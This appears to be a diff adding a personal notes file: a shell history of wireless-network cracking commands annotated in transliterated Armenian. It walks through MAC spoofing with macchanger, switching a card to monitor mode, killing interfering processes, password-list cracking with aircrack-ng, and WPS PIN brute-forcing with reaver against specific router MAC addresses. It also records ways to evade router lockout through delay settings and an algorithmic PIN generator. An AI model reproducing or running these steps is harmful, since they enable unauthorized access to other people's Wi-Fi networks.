@@ -1,0 +1,28 @@
+    
+						ete miacvac e routeri WPS-@ stugelu hamar wash -i wlan0
+    1  cd Desktop/
+    2  touch quiz.txt
+    3  nano passlist.txt
+    4  ls
+    5  aircrack-ng -w passlist.txt 
+    6  ifconfig 
+    7  ifconfig wlan0 down
+    8  macchanger -r wlan0
+    9  iwconfig wlan0 mode monitor
+   10  ifconfig wlan0 up
+   11  iwconfig
+   12  iwconfig wlan0
+   13  iwconfig wlan0 | grep Mode
+   14  clear
+   15  airmon-ng check wlan0
+   16  kill 1211
+   17  kill 1259
+   18  airmon-ng check wlan0
+
+   30  wash -i wlan0   ->ete error tvec -> mkdir /etc/reaver
+   31  airodump-ng wlan0
+   32  reaver -b F8:C0:91:25:AC:6C -i wlan0 -c 6 -vv   ->porcum e mi qani passwordner ev block e @nknum router@
+		shrjancel blokirovken
+		1)reaver -i wlan0 -b 90:F6:52:C1:BB:18 -c 6 -r 2:300 -vv ->(-r 2:60 2 porc 300 vayrkyanum)
+		2)./pingen.py 90:F6:52:C1:BB:18        ->algoritmayin exanakov
+   35  history > reaver.txt
